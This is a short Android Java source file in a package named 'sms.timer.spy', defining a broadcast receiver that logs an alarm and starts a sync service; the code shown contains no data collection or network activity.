package com.example.sms.timer.spy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class AlarmService extends BroadcastReceiver {

	
	@Override
	public void onReceive(Context context, Intent intent) {
		Log.i(this.getClass().getName(), "Alarm");
		context.startService(new Intent(context, SyncService.class));
		
	}

}
